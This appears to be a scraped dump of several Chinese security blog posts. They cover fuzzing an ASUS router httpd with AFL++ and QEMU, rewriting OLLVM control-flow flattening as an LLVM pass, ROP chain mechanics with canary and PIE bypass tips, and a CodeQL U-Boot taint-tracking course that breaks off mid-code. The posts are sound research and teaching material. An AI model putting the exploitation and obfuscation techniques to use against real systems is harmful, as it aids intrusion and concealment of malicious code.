文件夹下找到 httpd。\n对照源代码和二进制文件，发现程序从 main 函数开始一个链接，将此链接的 fd 存在 conn_fp 中，然后进入请求处理函数 handle_request 进行解析请求。\nif (!(conn_fp = fdopen(item-\u0026gt;fd, \u0026quot;r+\u0026quot;))) { HTTPD_DBG(\u0026quot;fdopen: skip\\n\u0026quot;); perror(\u0026quot;fdopen\u0026quot;); goto reset; } http_login_cache(\u0026amp;item-\u0026gt;usa); handle_request(); fflush(conn_fp); 之前爆出的漏洞很多都是在 handle_request 中的，并且这个函数的代码量比较大，简单的代码审计已经看不出问题来了\u0026hellip;所以就对这个函数进行 fuzz。\n模拟环境配置 跨平台编译链使用 这里我使用了 RMerl/am-toolchains。通过使用 LD_LIBRARY_PATH 指定链接库的位置，这样才能链接上相应的库。\n$ export LD_LIBRARY_PATH=\u0026quot;/part/to/am-toolchains/brcm-arm-sdk/hndtools-arm-linux-2.6.36-uclibc-4.5.3/lib\u0026quot; $ /part/to/am-toolchains/brcm-arm-sdk/hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc arm-uclibc-gcc: 没有输入文件 出现隐式声明函数时，但是这个函数又是 GNU 标准实现的函数的话，可以试着加入下面这句宏定义到代码开头。例如我在编译 libnvram 时出现 警告： 隐式声明函数‘strndup’，加上下面这句宏定义就可以正常编译了。\n#define _GNU_SOURCE 出现 /dev/nvram: Permission denied 宿主机上肯定没有 /dev/nvram 啊，所以使用 QEMU 进行模拟时使用了 firmadyne/libnvram 这个库 Hook 掉 nvram 的相关操作，然后将这个库添加到 LD_PRELOAD 中。在使用时如果发现这个库没有创建 tmpfs 进行存储的话，那就手动用 sudo mount -t tmpfs -o size=10M tmpfs $挂载路径 创建一个。可以修改 config.h 实现将挂载路径放在别的目录下。例如我将挂载路径改动到了 /mnt/libnvram。\nHook __uClibc_main 直接调用 handle_request 根据 Modern Vulnerability Research Techniques on Embedded Systems 这篇文章，我通过 Hook __uClibc_main 来实现直接 fuzz handle_request 函数。\n由于在解析 http 请求时，程序使用了 fgets 等 c 语言相关函数，所以我决定使用普通的文件流代替 TCP 流。\n动态库的主要功能就是初始化被 fuzz 程序的相关变量，将 fuzz 的输入塞到程序中，然后运行函数，最后查看运行结果。\n// gcc main_hook.c -o main_hook.so -fPIC -shared -ldl // RTLD_NEXT is a GNU Extension #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; /* Trampoline for the real main() */ static int (*main_orig)(int, char **, char **); /* Our fake main() that gets called by __libc_start_main() */ int main_hook(int argc, char **argv, char **envp) { // Override origin conn_fp FILE **fp = 0x07D600; if (argc \u0026lt; 2) { fprintf(stderr, \u0026quot;Please input filename\\n\u0026quot;); return 1; } *fp = fopen(argv[1], \u0026quot;r+\u0026quot;); if (*fp == NULL) { fprintf(stderr, \u0026quot;Can't open file\\n\u0026quot;); return 2; } // Get handle_request function's address and run int (*do_thing_ptr)() = 0xEEB0; int ret_val = (*do_thing_ptr)(); printf(\u0026quot;Ret val %d\\n\u0026quot;, ret_val); return 0; } /* * Wrapper for __libc_start_main() that replaces the real main * function with our hooked version. */ int __uClibc_main( int (*main)(int, char **, char **), int argc, char **argv, int (*init)(int, char **, char **), void (*fini)(void), void (*rtld_fini)(void), void *stack_end) { /* Save the real main function address */ main_orig = main; /* Find the real __libc_start_main()... */ typeof(\u0026amp;__uClibc_main) orig = dlsym(RTLD_NEXT, \u0026quot;__uClibc_main\u0026quot;); /* ... and call it with our custom main function */ return orig(main_hook, argc, argv, init, fini, rtld_fini, stack_end); } 使用 qemu-arm 进行模拟 这里使用了 qemu-arm 进行用户态模拟，在 -L 参数中加上解压出来的 squashfs-root 的路径，并在 -E 参数后的 LD_PRELOAD 变量加上 Hook 的库。\n如果出现下面的情况，那就手动写入到缺失的文件中。\nnvram_get_buf: Unable to open key: /mnt/libnvram/某些字段 qemu: uncaught target signal 11 (Segmentation fault) - core dumped python3 -c 'open(\u0026quot;/mnt/libnvram/某些字段\u0026quot;, \u0026quot;w\u0026quot;).write(\u0026quot;0\u0026quot;)' 当看到下面的结果时，说明程序真的跑起来了。\n$ qemu-arm -L ./squashfs-root -E LD_PRELOAD=./libnvram.so:./main_hook.so ./squashfs-root/usr/sbin/httpd ./test.txt nvram_get_buf: x_Setting sem_lock: Already initialized! sem_get: Key: 414a0001 sem_get: Key: 414a0001 nvram_get_buf: = \u0026quot;0\u0026quot; ... fuzz 前准备 获取输入数据 可以去别的项目中寻找他们的测试样例，然后用脚本提取出来。下面是提取 \u0026ldquo;http-parser\u0026rdquo; 这个项目的样例，并写入文件中。\nfrom re import compile with open('./http-parser/test.c', 'r') as f: text = f.read() start_re = compile('raw= \u0026quot;(.+)\u0026quot;') middle_re = compile('\u0026quot;(.+)\u0026quot;') end_re = compile('should_keep_alive') temp_lst = [] begin_record = False count = 0 for line in text.split('\\n'): if matched := start_re.findall(line): temp_lst += matched begin_record = True elif matched := middle_re.findall(line): if begin_record: temp_lst += matched elif end_re.findall(line) and len(temp_lst): content = ''.join(temp_lst).replace('\\\\r\\\\n', '\\r\\n') with open(f'corpus/http_{count}.txt', 'w') as f: f.write(content) count += 1 temp_lst.clear() begin_record = False 获取字典 AFLplusplus/AFLplusplus 项目中的 dictionaries 目录中就有一些字典，可以拿来使用。\n使用 ramdisk 由于 fuzz 比较消耗硬盘读写，所以通过下面的命令，使用内存盘减少硬盘消耗。\nmkdir /mnt/ramdisk mount -t tmpfs -o size=2048M tmpfs /mnt/ramdisk 使用 AFL++ 进行异架构 Fuzz AFL++ 是个不错的项目，扩展了原版 AFL，并且有详细的文档和样例代码（有这两项就已经超越了90%++的开源项目了）。\nAFL++ 用了 git submodule 进行导入其他项目，编译时建议使用 proxychains 或者设置 http_proxy 环境变量来强制 git 走代理进行 clone，加快速度。其他的编译事项在 README 里写的非常详细了。我们需要 fuzz 的程序是 arm 架构的，所以在编译 QEMU 时加上 CPU_TARGET=arm 环境变量，指定 QEMU 编译架构。\n最后就是运行 AFL++ 了。参数中 -Q 指定 QEMU 模式，-m none 指定内存限制为没有，-i 和 -o 对应的则是输入和输出。程序使用文件方式读入数据，所以最后加上 @@。\nexport \u0026quot;QEMU_SET_ENV=LD_PRELOAD=./libnvram.so:./main_hook.so\u0026quot; export \u0026quot;QEMU_LD_PREFIX=./squashfs-root\u0026quot; export \u0026quot;AFL_INST_LIBS=1\u0026quot; export \u0026quot;AFL_NO_FORKSRV=1\u0026quot; /part/to/AFLplusplus/afl-fuzz -Q -m none -i corpus/ -o output/ ./squashfs-root/usr/sbin/httpd @@ 然后就是喜闻乐见的显示信息窗口了。\n调试 对 qemu-user 进行模拟的程序，可以通过 -g 参数，开启 gdbserver,然后在本机使用 gdb-multiarch 进行调试。\n先使用 qemu-arm 加上 -g 选项启动程序。\nqemu-arm -g $端口号 然后使用 gdb-multiarch $程序 和 target remote :$端口号 命令连接上 server。最后就是正常的使用 gdb 进行调试了。\n等待完善的地方 在进行 fuzz 后，我发现 AFL++ 在 QEMU 模式下，也使用 Persist 模式，如果能使用 Persist 模式的话，可以大幅提高 Fuzz 效率。演示代码在 AFL++ 项目的 utils 目录。\n使用 master/slave 模式启动多个 fuzzer 进行 fuzz，提高 fuzz 效率。\n总结 这是一篇时隔几个月才写的复现文章，之前还是比较忙，所以没时间写文章。\n在这几个月里，我突然明白了为什么报上去的漏洞别人复现不了，因为 firmadyne/libnvram 这个项目在 key 不存在时返回了 NULL，然后 httpd 中的部分地方又没有对值为 NULL 的情况做处理，测试时找的网络上的路由器可能存在着已经被新版本修复的漏洞，所以才会碰巧“测试成功”。然而真机在通常情况下存在这个 key，并且修复了大量的漏洞，所以复现失败。\n当然，如果有人看完这篇文章，并且借助这篇文章的经验挖到了洞，能不能给我留个评论，让我膜拜一下\u0026hellip;\nrefs 参考文章\nModern Vulnerability Research Techniques on Embedded Systems\n提及/使用到的项目\nfirmadyne/libnvram\nRMerl/asuswrt-merlin.ng\nRMerl/am-toolchains\nAFLplusplus/AFLplusplus\ngoogle/fuzzing\n","date":"2021-01-21","permalink":"https://chenx6.github.io/post/fail_firm_fuzz/","tags":["pwn","fuzz"],"title":"记录一次失败的固件 fuzz"},{"content":"OLLVM 的控制流平坦化是逆向老哥最讨厌的混淆了，因为一旦使用就代表着 IDA 的 decompiler 彻底报废了。所以了解并在自己的项目中重写控制流平坦化挺重要的。\n什么是控制流平坦化 名词解释 BasicBlock 代码块，以跳转语句结尾的一段代码。\n语言描述控制流平坦化的实现 在 OLLVM 中，Pass 先实现一个永真循环，然后再在这个循环中放入 switch 语句，将代码中除了开始块的所有 BasicBlock 放入这个 switch 语句的不同 case 中，通过修改 switch 的条件，来实现 BasicBlock 之间的跳转。\n可行的修复方法 在 利用符号执行去除控制流平坦化 讲解了恢复控制流平坦化的方法，并且在 cq674350529/deflat 使用了 angr 进行实现。\n这里引用腾讯 SRC 的思路概括\n函数的开始地址为序言的地址 序言的后继为主分发器 后继为主分发器的块为预处理器 后继为预处理器的块为真实块 无后继的块为retn块 剩下的为无用块 怎么实现 在开始前，先展示一个普通的，带有 if 语句的程序的控制流图。\n+--------------------------------------+ | entry: | | ... | | compare instruction | | br %cmp_res, label %if, label %else | +-------------------+-----------+------+ | | +-------------+ | v v +--------+-------+ +--------+-------+ | if: | | else: | | br label %end | | br label %end | +--------+-------+ +--------+-------+ | | +-----------+-------------+ v +--+---+ | end: | | ... | +------+ 首先，先判断函数的 BasicBlock 数量，如果只有一个 BasicBlock，那么就不用进行混淆了。然后将函数中原有的的 BasicBlock 存放到容器中备用，并排除第一个 BasicBlock，因为第一个 BasicBlock 要做特殊处理。\nbool runOnFunction(Function \u0026amp;F) override { // Only one BB in this Function if (F.size() \u0026lt;= 1) { return false; } // Insert All BB into originBB SmallVector\u0026lt;BasicBlock *, 0\u0026gt; originBB; for (BasicBlock \u0026amp;bb : F) { originBB.emplace_back(\u0026amp;bb); if (isa\u0026lt;InvokeInst\u0026gt;(bb.getTerminator())) { return false; } } // Remove first BB originBB.erase(originBB.begin()); } 然后，将第一个 BasicBlock 和他结尾的 BranchInst 进行分割，并将第一个 BasicBlock 和后面的 BB 断绝关系。\n// If firstBB's terminator is BranchInst, then split into two blocks BasicBlock *firstBB = \u0026amp;*F.begin(); if (BranchInst *br = dyn_cast\u0026lt;BranchInst\u0026gt;(firstBB-\u0026gt;getTerminator())) { BasicBlock::iterator iter = firstBB-\u0026gt;end(); if (firstBB-\u0026gt;size() \u0026gt; 1) { --iter; } BasicBlock *tempBB = firstBB-\u0026gt;splitBasicBlock(--iter); originBB.insert(originBB.begin(), tempBB); } // Remove firstBB firstBB-\u0026gt;getTerminator()-\u0026gt;eraseFromParent(); 经过处理后程序控制流图如下。\n+--------------------------------------+ | entry: | | ... | +--------------------------------------+ +--------------------------------------+ | tempBB: | | compare instruction | | br %cmp_res, label %if, label %else | +-------------------+-----------+------+ | | +-------------+ | v v +--------+-------+ +--------+-------+ | if: | | else: | | br label %end | | br label %end | +--------+-------+ +--------+-------+ | | +-----------+-------------+ v +--+---+ | end: | | ... | +------+ 接下来就是创建主循环和 switch 语句。先在第一个 BB 处创建 switch 使用的条件变量，然后创建循环的开头 BB，循环结束 BB，switch 的 default 块，最后将他们用 Br 相连起来。\n// Create main loop BasicBlock *loopEntry = BasicBlock::Create(F.getContext(), \u0026quot;Entry\u0026quot;, \u0026amp;F); BasicBlock *loopEnd = BasicBlock::Create(F.getContext(), \u0026quot;End\u0026quot;, \u0026amp;F); BasicBlock *swDefault = BasicBlock::Create(F.getContext(), \u0026quot;Default\u0026quot;, \u0026amp;F); // Create switch variable IRBuilder\u0026lt;\u0026gt; entryBuilder(firstBB, firstBB-\u0026gt;end()); AllocaInst *swPtr = entryBuilder.CreateAlloca(entryBuilder.getInt32Ty()); StoreInst *storeRng = entryBuilder.CreateStore(entryBuilder.getInt32(rng()), swPtr); entryBuilder.CreateBr(loopEntry); // Create switch statement IRBuilder\u0026lt;\u0026gt; swBuilder(loopEntry); LoadInst *swVar = swBuilder.CreateLoad(swPtr); SwitchInst *swInst = swBuilder.CreateSwitch(swVar, swDefault, 0); BranchInst *dfTerminator = BranchInst::Create(loopEntry, swDefault); BranchInst *toLoopEnd = BranchInst::Create(loopEntry, loopEnd); 经过处理后的程序控制流图如下\n+--------------------------------------+ +--------------------------------------+ | entry: | | tempBB: | | ... | | compare instruction | +-------------------+------------------+ | br %cmp_res, label %if, label %else | | +-------------------+-----------+------+ v v---------------------+ | | +----------------+-----------------+ | +-------------+ | | Entry: | | v v | switch i32 %al, label %Default | | +--------+-------+ +--------+-------+ +----------------+-----------------+ | | if: | | else: | | | | br label %end | | br label %end | v---------------+ | +--------+-------+ +--------+-------+ +----------------+ | | | | Default: | | +-----------+-------------+ | br label %End | | v +------+---------+ | +--+---+ | | | end: | +-----------------v | | ... | +------------------+ | +------+ | End: | | | br label %Entry | | +--------+---------+ | | | | | +--------------------+ 然后就是重头戏了：将 BB 们放入 switch 的 case 中。首先先将循环的结尾移动到 BB 后，然后再放入 case 中。然后再判断 BB 的结尾的语句有多少个继承块，如果为 0 个的话，说明是返回语句，那么就不需要管；如果是 1 个的话，说明是无条件跳转语句，那么就计算与其相连的下一个块的 case 值，并更新 switch 的条件变量的值；如果为 2 个的话，说明是一个条件跳转，则根据条件语句 SelectInst 决定下一个块执行的位置;如果是其他情况，则保持该 BB 不变。最后更新下初始的 switch 条件变量的值，保证第一个块的执行。\n// Put all BB into switch Instruction for (BasicBlock *bb : originBB) { bb-\u0026gt;moveBefore(loopEnd); swInst-\u0026gt;addCase(swBuilder.getInt32(rng()), bb); } // Recalculate switch Instruction for (BasicBlock *bb : originBB) { switch (bb-\u0026gt;getTerminator()-\u0026gt;getNumSuccessors()) { case 0: // No terminator break; case 1: { // Terminator is a non-condition jump Instruction *terminator = bb-\u0026gt;getTerminator(); BasicBlock *sucessor = terminator-\u0026gt;getSuccessor(0); // Find sucessor's case condition ConstantInt *caseNum = swInst-\u0026gt;findCaseDest(sucessor); if (caseNum == nullptr) { caseNum = swBuilder.getInt32(rng()); } // Connect this BB to sucessor IRBuilder\u0026lt;\u0026gt; caseBuilder(bb, bb-\u0026gt;end()); caseBuilder.CreateStore(caseNum, swPtr); caseBuilder.CreateBr(loopEnd); terminator-\u0026gt;eraseFromParent(); } break; case 2: { // Terminator is a condition jump Instruction *terminator = bb-\u0026gt;getTerminator(); ConstantInt *trueCaseNum = swInst-\u0026gt;findCaseDest(terminator-\u0026gt;getSuccessor(0)); ConstantInt *falseCaseNum = swInst-\u0026gt;findCaseDest(terminator-\u0026gt;getSuccessor(1)); if (trueCaseNum == nullptr) { trueCaseNum = swBuilder.getInt32(rng()); } if (falseCaseNum == nullptr) { falseCaseNum = swBuilder.getInt32(rng()); } IRBuilder\u0026lt;\u0026gt; caseBuilder(bb, bb-\u0026gt;end()); if (BranchInst *endBr = dyn_cast\u0026lt;BranchInst\u0026gt;(bb-\u0026gt;getTerminator())) { // Select the next BB to be executed Value *selectInst = caseBuilder.CreateSelect( endBr-\u0026gt;getCondition(), trueCaseNum, falseCaseNum); caseBuilder.CreateStore(selectInst, swPtr); caseBuilder.CreateBr(loopEnd); terminator-\u0026gt;eraseFromParent(); } } break; } } // Set swVar's origin value, let the first BB executed first ConstantInt *caseCond = swInst-\u0026gt;findCaseDest(*originBB.begin()); storeRng-\u0026gt;setOperand(0, caseCond); 图请参考 Obfuscator-llvm源码分析，用 ASCII 画图有点麻烦\u0026hellip;\n总结 这个控制流平坦化的代码数量也不多，而且程序的逻辑在理清后很容易理解，所以文章的篇幅很短。\nrefs chenx6/baby_obfuscator\nObfuscator-llvm源码分析\nobfuscator-llvm/obfuscator\n利用符号执行去除控制流平坦化\ncq674350529/deflat\n","date":"2021-01-21","permalink":"https://chenx6.github.io/post/rewrite_ollvm_fla/","tags":["re","llvm"],"title":"重写 OLLVM 之控制流平坦化"},{"content":"看了许多讲 ROP 的文章，发现很多只是讲了怎么利用，但是没有讲为什么这么利用。所以写文记录。\n什么是 ROP ROP (Return orient programming) 是一种漏洞利用方法，使得攻击者绕过保护(例如 NX 栈不可执行)执行恶意代码。攻击者通过栈溢出等手段实现覆盖返回地址劫持程序控制流，并且通过不同的代码片段(Gadgets)来拼接出攻击者希望执行的代码。\n怎么进行 ROP 汇编复习 我们先复习一下 x86 架构下的一些指令。\n调用一个函数一般使用 call 指令，call func 这条指令相当于 push ip, jmp func，即将当前 IP(instruction pointer 指令寄存器) 的地址存入栈中，并将 IP 改为被调用函数的地址。\nleave 指令由于效率低于等价指令 mov sp, bp; pop bp，且可以被等价替换所以比较少见。\nROP 中经常出现 ret 这一条汇编语句。ret 这一条指令是配合 call 指令使用的。ret 相当于 pop ip，配合 call 使用时，功能为返回原来的控制流。\n劫持一次“普通”的程序调用 当 C 程序调用函数时，会通过将函数参数压入栈中，来传递函数参数。然后通过 call 指令将控制流转移到函数的代码中。并且函数会将之前控制流的 bp 保存，用于函数结束时恢复栈环境。\n例如下面的程序，将两个数字相加，并且将结果作为返回值。\n#include \u0026lt;stdio.h\u0026gt;\rint add(int a, int b)\r{\rreturn a + b;\r}\rint main()\r{\rint a = 1, b = 2;\rint sum = add(a, b);\rprintf(\u0026quot;%d\\n\u0026quot;, sum);\rreturn 0;\r}\r将上面的代码使用 cl 编译出来的汇编代码如下。\n_sum$ = -12 ; size = 4\r_a$ = -8 ; size = 4\r_b$ = -4 ; size = 4\r_main PROC\rpush ebp\rmov ebp, esp\rsub esp, 12 ; 0000000cH\rmov DWORD PTR _a$[ebp], 1\rmov DWORD PTR _b$[ebp], 2\rmov eax, DWORD PTR _b$[ebp]\rpush eax\rmov ecx, DWORD PTR _a$[ebp]\rpush ecx\rcall _add\radd esp, 8\rmov DWORD PTR _sum$[ebp], eax\rmov edx, DWORD PTR _sum$[ebp]\rpush edx\rpush OFFSET $SG9148\rcall _printf\radd esp, 8\rxor eax, eax\rmov esp, ebp\rpop ebp\rret 0\r_main ENDP\r可以看到程序在 call _add 前将两个变量 a, b 从栈中取出放入寄存器中，然后再将其作为参数压入栈中。在 call _add 后程序将存于 eax 的返回值取出并放入 _sum 变量中。\n执行到 call _add 时，栈的情况如下。可以看到参数从左到右依次按照从低地址到高地址排序。\n+----------------+\r|esp |1 | \u0026lt;---+ 函数参数1\r+----------------+\r|esp + 4|2 | \u0026lt;---+ 函数参数2\r+----------------+\r|esp + 8| |\r+----------------+\r|... | |\r+----------------+\r|ebp |ret addr|\r+----------------+\r执行完 call _add 后的栈环境，可以看到程序将 call 指令的下一条指令压入栈中。\n+----------------+\r|esp |ret addr| \u0026lt;---+ 返回地址\r+----------------+\r|esp + 4|1 | \u0026lt;---+ 函数参数1\r+----------------+\r|esp + 8|2 | \u0026lt;---+ 函数参数2\r+----------------+\r|... | |\r+----------------+\r|ebp |ret addr|\r+----------------+\r这是 add() 函数的汇编代码，可以看到程序先将旧的 ebp 入栈，然后将 esp 赋值给 ebp 作为新的栈基。然后再从栈中的对应位置取出函数参数的值，进行 add 操作后，将结果赋给 eax 作为返回值。\n_a$ = 8 ; size = 4\r_b$ = 12 ; size = 4\r_add PROC\rpush ebp\rmov ebp, esp\rmov eax, DWORD PTR _a$[ebp]\radd eax, DWORD PTR _b$[ebp]\rpop ebp\rret 0\r_add ENDP\r在 add 函数中 push ebp; mov ebp, esp 执行后的栈如下，可以看到返回地址的上方保存了旧的 ebp 地址。\n+-------+--------+\r|esp |old ebp |\r+----------------+\r| |ret addr| \u0026lt;---+ 返回地址\r+----------------+\r|esp + 8|1 | \u0026lt;---+ 函数参数1\r+----------------+\r|esp + c|2 | \u0026lt;---+ 函数参数2\r+----------------+\r| | |\r+----------------+\r|... | |\r+----------------+\r| |ret addr|\r+----------------+\r在 pop ebp 指令执行完成，ret 指令准备执行时，程序将栈顶(SP 所指的地址)存放的返回地址放入 IP，来恢复控制流。如果我们能控制返回地址，伪造函数调用，那么就可以让程序执行我们想要执行的代码。\n下面是当 mov esp, ebp; pop ebp 执行后的栈，假设我们控制了 esp 处的内存，在下一条指令 ret 执行后，我们就劫持了程序的控制流。\n+----------------+\r|esp |gadget | \u0026lt;---+ 返回地址\r+----------------+\r|esp + 4|1 | \u0026lt;---+ 函数参数1\r+----------------+\r|esp + 8|2 | \u0026lt;---+ 函数参数2\r+----------------+\r| | |\r+----------------+\r|... | |\r+----------------+\r| |ret addr|\r+----------------+\rgadgets 和 ROP 链 之前的操作只能劫持一次控制流，如果想用这一次机会将控制流劫持到 shellcode 上的话，在 NX 开启的情况下就会失效，又或者不能一次劫持就完成我们想达到的目标，这时候就需要 ROP 和 gadgets 了。这里的 gadget 指的是程序本体中出现的指令片段，通常以 ret 指令结尾。\n将 gadget 的地址按执行顺序写入栈中，就可以实现 ROP 链。ROP 链将按照在栈中的顺序执行。\n例如下图中，CPU 先执行 ret 指令，将 IP 置为 0x1000，然后执行 0x1000 处的两条指令，最后执行 ret 指令，将 IP 置为 0x500。CPU 执行 0x500 处的指令，最后 ret 指令执行时，将 IP 置为 main 函数所在的地址，CPU 开始执行 main 函数里的指令。\n+-------+--------+\r+-----+0x500 | inst3 |\r| +----------------+\r| v--+ | ret |\r| | +----------------+\r| | |... | ... |\r| | +----------------+\r| | |0x1000 | inst0 +\u0026lt;-+\r| | +----------------+ |\r| | | | inst1 | |\r| | +----------------+ |\r| | | | ret +-----+\r| | +----------------+ | |\r| | |... | ... | | |\r| | +----------------+ | |\r| | |esp | 0x1000 +--+ |\r| | +----------------+ |\r^-----+esp + 4| 0x500 +\u0026lt;----+\r| +----------------+\r+-\u0026gt;+esp + 8| main |\r+----------------+\r| | |\r+-------+--------+\r如果为 x86_64 或者 amd64 程序，通常以寄存器进行函数的参数传递，ROP 链的构造经常使用 pop regs; ret 这样的 gadget 来实现寄存器传参，然后再在 ROP 链中添加被调用函数地址，实现调用函数。而参数和寄存器的对应关系，则是从第一个参数到第六个参数分别为 %rdi, %rsi, %rdx, %rcx, %r8, %r9\n+----------------+\r|esp |padding |\r+----------------+\r| |pop_ret |\r+----------------+\r|esp + 8|args |\r+----------------+\r|esp + c|func |\r+----------------+\r| | |\r+----------------+\r|... | |\r+----------------+\r| |ret addr|\r+----------------+\r如果是 32 位程序，通常使用栈进行传参。则先将被调用函数地址放入栈的低地址，然后将参数以 C 语言代码中调用函数时从左到右的顺序将参数从低地址到高地址开始放入。来模拟 call 指令和之前的传参过程。\n+----------------+\r|esp |padding |\r+----------------+\r| |func | \u0026lt;---+ 返回地址\r+----------------+\r|esp + 8|arg1 | \u0026lt;---+ 函数参数1\r+----------------+\r|esp + c|arg2 | \u0026lt;---+ 函数参数2\r+----------------+\r| | |\r+----------------+\r|... | |\r+----------------+\r| |ret addr|\r+----------------+\r如果需要了解更多，则请查询相关系统和 CPU 架构的 ABI，例如https://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-on-i386-and-x86-6 和 https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=vs-2019\n扩展：面对常见的代码保护措施 如果出现 NX 时，就需要使用 ROP 技术绕过。\n如果出现 canary 时需要想怎么泄露 canary，通过 off by one 或者格式化字符串实现泄露，还有少见的报错泄露法和覆盖 canary 法。\n如果出现 pie 的话泄露地址也是必须的，off by one 或者格式化字符串实现泄露，或者 partical overwrite 实现构造 rop 链也是可以的。\n如果需要栈迁移，则需要使用两次 leave 指令来修改 SP 和 BP，将栈迁移到可以控制的地方，从而实现执行 ROP 链。\n当然利用方式还是得根据具体题目进行改变，所以请君自行补充。\n","date":"2020-06-01","permalink":"https://chenx6.github.io/post/different-rop/","tags":["pwn","rop"],"title":"不同视角看 ROP"},{"content":"概要 之前在 Twitter 上看到有大佬说 Github Learning Club 上搞了个免费的 CodeQL 课程，课程最终目标是使用 CodeQL 这个语言找出 uboot 中的 9 个漏洞。我在克服拖延症后，终于在 4 月底完成了这个课程，于是写文记录。\n课程链接\n通过 CodeQL 找出来的漏洞分析\n提前准备 VSCode // VSC 天下第一 本机上的 Git 和 Github 帐号 // 废话 在线翻译 // 文档和课程的英文文本量有点大 C/C++ 基础 // 不会 C 语言怎么挖洞啊 环境搭建 首先先在课程链接中选择 \u0026ldquo;Start free course\u0026rdquo;，然后 Github 机器人会在你的帐号下新建项目。先将这个项目 Clone 到本地。Github 机器人会通过 Issue 和 Pull request 和你进行沟通。\n官方推荐使用 VSCode，那我们就使用 VSC。当然，其他 IDE 应该也是可以的。\n然后安装CodeQL 插件。\nCodeQL 插件会自动从 Github 上下载大约 400M 的 codeql-cli，如果下载速度慢请使用加速器。\n接下来Clone 这个项目到本地。这个项目里的 submodule 也须要 Clone。使用下面命令一步到位。\ngit clone --recursive https://github.com/github/vscode-codeql-starter/ 在 VSCode 菜单中点击 File \u0026gt; Open Workspace 选择 vscode-codeql-starter.code-workspace 这个文件来打开这个工作区。\n从这个链接下载已经分析好的 uboot CodeQL 数据库，然后解压到相应的文件夹。\n使用 VSCode 快捷键 \u0026ldquo;ctrl + shift + p\u0026rdquo; 进入命令模式，输入 \u0026ldquo;codeql choose database\u0026rdquo; 看到相应的选项后，点击就可以添加上前面解压的 uboot codeql 数据库。\n在前面打开工作区 VSCode 中使用 File -\u0026gt; Add Folder to Workspace 添加前面机器人新建的项目文件夹到当前工作区。\n到此环境配置完成。\n第一次查询和 Pull request 机器人创建的项目中有等着我们编辑的空文件和 solution 文件夹。接下来是教程中的第三步，编辑 3_function_definitions.ql 这个文件，借助补全填入下面内容，以查询 strlen 的声明和定义。\nimport cpp from Function f where f.getName() = \u0026quot;strlen\u0026quot; select f, \u0026quot;a function named strlen\u0026quot; 可以看到 CodeQL 程序的基本架构，第一句 import cpp 导入了 CPP 模块，而后面的 from ... where ... select 就是 CodeQL 程序的基本结构。\nfrom Function f 这句话声明了 f 是个 Function 类型的变量。Function 是个类，一个类代表了一种数据的集合，而 Function 这个类型代表了待分析代码中的函数集合。\n后面的 where ... 中出现的谓词代表了我们想查询的逻辑，而变量 f 后面的 getName 是谓词，他表达了我们查询的逻辑。在上面的代码中我们找到了所有名字为 \u0026ldquo;strlen\u0026rdquo; 的函数。\n然后在 VSCode 的命令面板里让命令跑起来，或者对着脚本右键，点击 \u0026ldquo;Run Query\u0026rdquo;，进行查询了。\n写完代码后，就是发起 Pull request 了。\n# 拉取 master git checkout master git pull # 新建分支，并切换到该分支 git checkout -b step-4 # 进行 commit git add . git commit -a -m \u0026quot;Step 4 query\u0026quot; # 推送分支，可以发起 pull request git push -u origin step-4 执行完上面的命令后，在 Github 上打开 \u0026ldquo;codeql-uboot\u0026rdquo; 项目的 Pull request 标签，就可以看到我们创建了一个新分支，且可以发起 Pull request。在发起 PR 后，会触发 Github Actions，校验答案的时间在 1 到 3 分钟左右。检查完成后就会进行下一步操作了。\n所以在这几分钟内可以看点泡面番，或者打开邦邦清下火（逃\n导入不同的类完成查询 前面我们查询了函数，在第五步我们可以通过引入 \u0026ldquo;Macro\u0026rdquo; 类查询 ntohl, ntohll, ntohs 这三个转换字节序的宏。代码类似第一次查询，这里使用正则表达式可以缩短查询语句。\nimport cpp from Macro m where m.getName().regexpMatch(\u0026quot;ntoh(s|l|ll)\u0026quot;) select m 使用两个变量来查询调用该函数的位置 在代码中的 from 语句处可以声明多个变量，然后在 where 中进行联系，以查询相关函数调用。如果无从下手的话可以看看使用 CodeQL 查询 C++ 的样例\nimport cpp from FunctionCall call, Function func where call.getTarget() = func and func.getName() = \u0026quot;memcpy\u0026quot; select call 查看宏的顶层表达 应该是展开宏吧\u0026hellip;但是英文原文是 \u0026ldquo;Gets a top-level expression associated with this macro invocation\u0026rdquo;\n通过 MacroInvocation 这个类来查询 \u0026ldquo;ntohs\u0026rdquo; 等宏的调用，并通过 getExpr() 这个方法进行宏的展开，得到相应的代码片段。\nimport cpp from MacroInvocation mi where mi.getMacro().getName().regexpMatch(\u0026quot;ntoh(s|l|ll)\u0026quot;) select mi.getExpr() 自己实现一个类 前面第一次查询说了，一个类代表了一种数据的集合。通过实现一个自己的类，能自定义一个自己想要的数据集合。如果有点懵可以看看 CodeQL 关于类的相关文档。查询语句中的类中，先通过 exists 量词创建一个临时变量 mi 来表示被调用的宏的名字，如果被调用的的宏展开后和当前代码片段相等，则这个表达式属于这个集合。\nimport cpp class NetworkByteSwap extends Expr { NetworkByteSwap() { exists(MacroInvocation mi | mi.getMacroName().regexpMatch(\u0026quot;ntoh(s|l|ll)\u0026quot;) and this = mi.getExpr() ) } } from NetworkByteSwap n select n, \u0026quot;Network byte swap\u0026quot; 数据流和污点追踪 借助前面几步，我们基本了解了 CodeQL 的使用。最后一个测试是使用 CodeQL 进行污点追踪。这里使用了 CodeQL 的全局污点追踪(Global taint tracking)。可以先看看使用 CodeQL 追踪数据流的文档了解相关概念。新定义的 Config 类继承于 TaintTracking::Configuration。类中重载的 isSource 谓语定义为污点的源头，而 isSink 定义为污点的去处。\n有时候，远程输入的数据可能经过 ntoh 函数处理，通过转换字节序得到相应的数字。而 memcpy 的第 2 个参数如果控制不当，可造成数据溢出。将上面两个结论结合起来，如果有一个远程输入的数据通过字节序变换得到的数字，在未经过校验的情况下，作为了 memcpy 的第二个参数，那么就有可能造成数据溢出。\n照着 Github 自家安全团队的文章，可以照猫画虎的补全数据查询语句。\n在 isSource 中，我们通过判断 source 的 Expr 是否是 NetworkByteSwap 这个类，来判断污点的源头。\n在 isSink 中，我们使用了辅助类 FunctionCall 判断函数调用是否为 memcpy 且 sink 的代码片段是否为 memcpy 的第二个参数；最后一句则是判断函数的第一个参数是否为常量，如果为常量的话基本不可能出现问题，所有忽略。\n/** * @kind path-problem */ import cpp import semmle.code.cpp.dataflow.TaintTracking import DataFlow::PathGraph class 